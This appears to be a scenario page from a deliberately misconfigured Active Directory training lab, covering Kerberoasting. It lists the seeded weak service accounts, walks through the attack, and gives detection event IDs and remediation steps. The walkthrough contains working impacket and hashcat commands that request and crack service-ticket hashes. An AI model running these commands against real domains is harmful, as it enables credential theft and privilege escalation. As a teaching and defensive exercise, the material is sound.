# Scenario 1 - Kerberoasting

| | |
|---|---|
| **MITRE ATT&CK** | T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting |
| **Toggle** | `misconfig.kerberoast` |
| **Role** | `misconfig_kerberoast` |
| **Foothold** | Any authenticated domain user |

## Objective

Obtain the plaintext of a service account by requesting a Kerberos service
ticket (TGS) and cracking it offline, without ever touching the target service.

## Seeded configuration

Four enabled service accounts with SPNs and a weak, non-expiring password
(`user_seed.service_password`):

| Account | SPN |
|---------|-----|
| `svc_sql` | `MSSQLSvc/SRV-SQL01.corp.contoso.lab:1433` |
| `svc_iis` | `HTTP/SRV-IIS01.corp.contoso.lab` |
| `svc_backup` | `HOST/SRV-FILE01.corp.contoso.lab` |
| `svc_monitor` | `HOST/SRV-MGMT01.corp.contoso.lab` |

## Attack walkthrough

```bash
# From the Kali box, as any domain user (e.g. eevans).
# Request crackable TGS hashes for every SPN-bearing account.
impacket-GetUserSPNs corp.contoso.lab/eevans:'<password>' -dc-ip 10.10.10.10 \
  -request -outputfile kerberoast.hashes

# Crack offline with the range wordlist.
hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt
```

The recovered `svc_sql` password can then be sprayed or used directly against
SQL Server, which is the SQL-Admins escalation the AD CS and delegation
scenarios build on.

### BloodHound view

`svc_*` accounts appear as **Kerberoastable Users**. The engine reports this as
`Kerberoastable service accounts` in the findings section.

## Detection

- **4769** - A Kerberos service ticket was requested, with encryption type
  `0x17` (RC4) and no accompanying **4768** TGT in the same session.
- **Sysmon 1** - `hashcat` runs on the analyst host (not the DC).
- EDR: high-volume 4769 from a single non-service account.

## Remediation

- Use managed service accounts (gMSA) or at least 25+ character random
  passwords for SPN-bearing accounts.
- Prefer AES over RC4 so cracked hashes are far harder to recover.
- Remove SPNs that are no longer required; audit `setspn -Q */*` on a schedule.
- Enforce least privilege so a cracked service account is not also privileged.

## References

- MITRE T1558.003
- Microsoft: "Kerberos roasting" detection guidance
